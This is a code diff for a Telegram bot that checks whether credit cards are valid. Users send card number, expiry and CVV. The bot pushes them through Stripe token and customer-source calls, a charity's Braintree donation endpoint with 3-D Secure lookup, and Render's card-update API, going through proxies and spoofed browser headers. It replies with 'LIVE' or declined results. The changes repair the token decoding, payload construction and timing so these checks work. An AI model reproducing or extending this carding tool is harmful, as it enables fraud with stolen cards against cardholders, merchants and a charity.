@@ -7,6 +7,8 @@ import random
 import yaml
 import asyncio
 import re
+import base64
+import json
 
 from aiogram import Bot, Dispatcher, executor, types
 from aiogram.utils.exceptions import Throttled
@@ -70,7 +72,7 @@ async def helpstr(message: types.Message):
     MSG = f'''
 Hello {FIRST}, I'm bot
 BOSS:  <a href="tg://user?id={OWNER}">HERE</a>
-Cmds \n/ck Charge 0.8$ \n/bin \n/cv 4.99$'''
+Cmds \n/ck Charge 0.8$ \n/bin \n/cv 4.99$\nhận/vbv check vbv'''
     await message.answer(MSG, reply_markup=keyboard_markup,
                         disable_web_page_preview=True)
 
@@ -623,7 +625,8 @@ async def ch(message: types.Message):
       rx =  requests.post('https://api.stripe.com/v1/tokens',
                           data=load, headers=header)
       LastF = f'************{ccn[-4:]}'
-      toc3 = time.perf_counter()
+      toc11 = time.perf_counter()
+      toc1 = toc11 - tic
       if 'declined' in rx.text:
             res = rx.json()
             msg = res['error']['message']
@@ -632,7 +635,7 @@ async def ch(message: types.Message):
 <b>STATUS</b>➟ Declined
 <b>MSG</b>➟ {msg}
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc3 - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc11 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -644,7 +647,7 @@ async def ch(message: types.Message):
 <b>STATUS</b>➟ Incorrect_number
 <b>MSG</b>➟ Your card number is incorrect.
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc3 - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc11 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -656,7 +659,7 @@ async def ch(message: types.Message):
 <b>STATUS</b>➟ Request rate limit exceeded.
 <b>MSG</b>➟ {msg}
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc3 - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc11 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -669,7 +672,7 @@ async def ch(message: types.Message):
 <b>STATUS</b>➟ API Key provided
 <b>MSG</b>➟ {msg}
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc3 - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc11 - tic:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -700,7 +703,9 @@ async def ch(message: types.Message):
         res1 = rx.json()
 
 
-        toc4 = time.perf_counter()
+        toc21 = time.perf_counter()
+        toc2 = toc21 - tic + toc1
+        
 
         if 'declined' in rx.text:
             res = rx.json()
@@ -710,7 +715,7 @@ async def ch(message: types.Message):
 <b>STATUS</b>➟ Declined
 <b>MSG</b>➟ {msg}
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc4 - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -722,7 +727,7 @@ async def ch(message: types.Message):
 <b>STATUS</b>➟ Incorrect_number
 <b>MSG</b>➟ Your card number is incorrect.
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc4 - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -734,7 +739,7 @@ async def ch(message: types.Message):
 <b>STATUS</b>➟ Request rate limit exceeded.
 <b>MSG</b>➟ {msg}
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc4 - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 
 <b>BOT</b>: @{BOT_USERNAME}''')
@@ -747,7 +752,7 @@ async def ch(message: types.Message):
 <b>STATUS</b>➟ API Key provided
 <b>MSG</b>➟ {msg}
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc4 - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc2:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
         
@@ -762,23 +767,37 @@ async def ch(message: types.Message):
             "user-agent": UA,
             "accept-language": "en-US,en;q=0.9"
         }
-         payload2 = {
-             }
+         payload2 = { 
+              
+         }
         
 
-         rc =  session.post('https://api.stripe.com/v1/customers/{cus}/sources/{card}', data=payload2, headers=head)
+         rc =  session.post('https://api.stripe.com/v1/customers/'+cus+'/sources/'+card+'', data=payload2, headers=head)
          res2 = rc.json()        
-         toc4 = time.perf_counter()
+         toc31 = time.perf_counter()
+         toc3 = toc31 - tic
+         toc = toc1 + toc2 + toc3
+         
                          
-         if ':' in rc.text:
-            return await message.reply(f'''{rc.text}''')
+         if 'Request rate limit exceeded.' in rc.text:
+            
+            msg = res2['error']['message']
+            return await message.reply(f'''
+❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
+<b>STATUS</b>➟ Request rate limit exceeded.
+<b>MSG</b>➟ {msg}
+<b>PROXY-IP</b> <code>{b}</code>
+<b>TOOK:</b> <code>{toc2:0.2f}</code>(s)
+<b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
+
+<b>BOT</b>: @{BOT_USERNAME}''')
          if 'pass' in rc.text:
             return await message.reply(f'''
 ✅<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>STATUS</b>➟ LIVE STRIPE
 <b>MSG</b>➟ cvc_check: "pass"
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc4 - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
          if 'unavailable' in rc.text:
@@ -786,7 +805,7 @@ async def ch(message: types.Message):
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
 <b>MSG</b>➟ cvc_check: "unavailable"
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc4 - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -857,31 +876,50 @@ async def ch(message: types.Message):
             "content-type": "application/x-www-form-urlencoded"
         }
 
-        r2 = session.post('https://charliewaller.org/umbraco/BraintreeDonation/BraintreeDonationSurface/ClientToken',
+        r2 = session.get('https://charliewaller.org/umbraco/BraintreeDonation/BraintreeDonationSurface/ClientToken',
                           headers=head)
+        
         clientToken1 = r2.json()['clientToken']  
-        clientToken = base64.b64decode(clientToken)
-        bearer = clientToken.json()['authorizationFingerprint']              
-        toc = time.perf_counter()
+        clientToken = base64.b64decode(clientToken1)
+        
+        content = json.loads(clientToken.decode('utf-8'))        
+        bearer = content['authorizationFingerprint']
+        
+        
+        toc11 = time.perf_counter()
+        toc1 = toc11 - tic
 
-        payload2 = { "clientSdkMetadata": {"source":"client", "integration":"dropin2","sessionId":"{Guid}"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!){   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"{ccn}","expirationMonth":"{mm}","expirationYear":"{yy}","cvv":"{cvv}","cardholderName":"{First} {Last}"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}
+        payload2 = { "clientSdkMetadata": {"source":"client", "integration":"dropin2","sessionId":Guid},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!){   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":ccn,"expirationMonth":mm,"expirationYear":yy,"cvv":cvv,"cardholderName":First+" botne"},"options":{"validate":"false"}}},"operationName":"TokenizeCreditCard"}
+       
             
             
         
  
         head2 = {
-            "user-agent": UA,
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/x-www-form-urlencoded"
+            "user-agent": UA,   
+            #"accept": "application/json, text/plain, */*",
+            "content-type": "application/json",
+            "authorization": "Bearer "+bearer,
+            "braintree-Version": "2018-05-10",
+            "host": "payments.braintree-api.com",
+            "origin": "https://assets.braintreegateway.com",
+            "referer": "https://assets.braintreegateway.com/"
+            
         }
-
-        r3 = session.post('https://payments.braintree-api.com/graphql', data=payload2,
+        
+        r3 = requests.post('https://payments.braintree-api.com/graphql', json=payload2,
                           headers=head2)
-        tokenizeCreditCard = r3.json()['data']['tokenizeCreditCard']  
-        token1 = tokenizeCreditCard['token']
-        bin = tokenizeCreditCard['creditCard']['bin']
-        brand = tokenizeCreditCard['creditCard']['brandCode']
-        bindata =  tokenizeCreditCard['creditCard']['binData']
+        
+        toc21 = time.perf_counter()
+        toc2 = toc21 - tic
+        res = r3.json()
+        
+        
+      
+        token1 = res['data']['tokenizeCreditCard']['token']
+        brand = res['data']['tokenizeCreditCard']['creditCard']['brandCode']
+        bin = res['data']['tokenizeCreditCard']['creditCard']['bin']
+        bindata =  res['data']['tokenizeCreditCard']['creditCard']['binData']
         bank = bindata['issuingBank']
         country = bindata['countryOfIssuance']
 
@@ -889,14 +927,14 @@ async def ch(message: types.Message):
 
         payload3 = {"amount":"1",
          "additionalInfo":{"acsWindowSize":"03"},
-         "bin":"{bin}",
+         "bin":bin,
          "dfReferenceId":"1_f802e5f3-2dc6-4b6d-a28b-2d98b0ebcaf3",
          "clientMetadata":{"requestedThreeDSecureVersion":"2",
          "sdkVersion":"web/3.58.0",
          "cardinalDeviceDataCollectionTimeElapsed":842,
          "issuerDeviceDataCollectionTimeElapsed":602,
-         "issuerDeviceDataCollectionResult":true},
-         "authorizationFingerprint":"{bearer}",
+         "issuerDeviceDataCollectionResult":"true"},
+         "authorizationFingerprint":bearer,
          "braintreeLibraryVersion":"braintree/web/3.58.0",
          "_meta":{"merchantAppId":"charliewaller.org",
          "platform":"web",
@@ -907,19 +945,24 @@ async def ch(message: types.Message):
          "sessionId":Guid}
                    }
         
- 
+        
         head3 = {
             "user-agent": UA,
-            "accept": "application/json, text/plain, */*",
-            "content-type": "application/x-www-form-urlencoded",
+            "accept": "*/*",
+            #"content-type": "application/x-www-form-urlencoded",
             "accept-Language": "en-GB,en;q=0.9,en-US;q=0.8",
             "host": "api.braintreegateway.com",
             "origin": "https://charliewaller.org",
             "referer": "https://charliewaller.org/"
         }
-
-        r4 = session.post('https://api.braintreegateway.com/merchants/zhqjdd67457jvj8k/client_api/v1/payment_methods/<tokencc>/three_d_secure/lookup', data=payload2,
+        
+        r4 = session.post('https://api.braintreegateway.com/merchants/zhqjdd67457jvj8k/client_api/v1/payment_methods/'+token1+'/three_d_secure/lookup', json=payload3,
                           headers=head3)
+        toc31 = time.perf_counter()
+        toc3 = toc31 - tic
+        
+        toc = toc1 + toc2 + toc3
+        
         threeDSecureInfo = r4.json()['paymentMethod']['threeDSecureInfo']
         status = threeDSecureInfo['status']
 
@@ -933,7 +976,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -947,7 +990,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -961,7 +1004,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -975,7 +1018,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -989,7 +1032,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''') 
     
@@ -1003,7 +1046,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
  
@@ -1017,7 +1060,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1031,7 +1074,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1045,7 +1088,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1059,7 +1102,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
  
@@ -1073,7 +1116,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1087,7 +1130,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
  
@@ -1101,7 +1144,7 @@ async def ch(message: types.Message):
 𝗖𝗼𝘂𝗻𝘁𝗿𝘆: {country}
 
 <b>PROXY-IP</b> <code>{b}</code>
-<b>TOOK:</b> <code>{toc - tic:0.2f}</code>(s)
+<b>TOOK:</b> <code>{toc:0.2f}</code>(s)
 <b>CHECK BY</b>➟ <a href="tg://user?id={ID}">{FIRST}</a>
 <b>BOT</b>: @{BOT_USERNAME}''')
 
@@ -1180,7 +1223,8 @@ async def ch(message: types.Message):
 
         rx = session.post('https://api.stripe.com/v1/tokens',
                           data=load, headers=header)
-        res = rx.json()   
+        res = rx.json() 
+        print(rx.text)
         toc1 = time.perf_counter()
        
         
@@ -1250,12 +1294,18 @@ async def ch(message: types.Message):
           country = card['country']
           brand = card['brand']
           funding = card['funding']
+          last4 = card['last4']
+          
 
-          payload = {"operationName":"updateCard","variables":{"id":"usr-cboij3n9re0t6g5u4h30","token":"{token}","brand":"{brand}","last4":"{LastF}","country":"US","region":"NY"},"query":"mutation updateCard($id: String!, $token: String!, $brand: String!, $last4: String!, $country: String!, $region: String!) {\n  updateCard(\n    id: $id\n    token: $token\n    brand: $brand\n    last4: $last4\n    country: $country\n    region: $region\n  ) {\n    ...ownerFields\n    ...ownerBillingFields\n    __typename\n  }\n}\n\nfragment ownerBillingFields on Owner {\n  cardBrand\n  cardLast4\n  __typename\n}\n\nfragment ownerFields on Owner {\n  id\n  billingStatus\n  email\n  featureFlags\n  notEligibleFeatureFlags\n  notifyOnFail\n  slackConnected\n  logEndpoint {\n    endpoint\n    token\n    updatedAt\n    __typename\n  }\n  __typename\n}\n"}
-
+          payload = {"operationName":"updateCard","variables":{"id":"usr-cboij3n9re0t6g5u4h30","token":"{token}","brand":"{brand}","last4":"{last4}","country":"US","region":"NY"},"query":"mutation updateCard($id: String!, $token: String!, $brand: String!, $last4: String!, $country: String!, $region: String!) {\n  updateCard(\n    id: $id\n    token: $token\n    brand: $brand\n    last4: $last4\n    country: $country\n    region: $region\n  ) {\n    ...ownerFields\n    ...ownerBillingFields\n    __typename\n  }\n}\n\nfragment ownerBillingFields on Owner {\n  cardBrand\n  cardLast4\n  __typename\n}\n\nfragment ownerFields on Owner {\n  id\n  billingStatus\n  email\n  featureFlags\n  notEligibleFeatureFlags\n  notifyOnFail\n  slackConnected\n  logEndpoint {\n    endpoint\n    token\n    updatedAt\n    __typename\n  }\n  __typename\n}\n"}
+                    
           head = {
             "accept": "*/*",
-            "content-type": "application/json",
+            "accept": "application/json",
+            "content-type": "application/x-www-form-urlencoded",
+            "accept-encoding": "gzip, deflate, br",
+            "access-control-request-headers": "authorization,content-type,render-request-id",
+            ""
             "user-agent": UA,
             "origin": "https://dashboard.render.com",
             "referer": "https://dashboard.render.com/select-repo?type=pserv",
@@ -1268,6 +1318,7 @@ async def ch(message: types.Message):
           ri = requests.post('https://api.render.com/graphql', data=payload,
                           headers=head)
           res1 = ri.json() 
+          print(ri.text)
 
           toc = time.perf_counter()
 
@@ -1300,8 +1351,8 @@ async def ch(message: types.Message):
 <b>BOT</b>: @{BOT_USERNAME}''')
 
           if 'errors' in ri.text:
-            msg = res['errors'][0]['message']
-            #msg = res['errors']['message']
+            msg = res1['errors'][0]['message']
+            #msg = res1['errors']['message']
             
             return await message.reply(f'''
 ❌<b>CC</b>➟ <code>{ccn}|{mm}|{yy}|{cvv}</code>
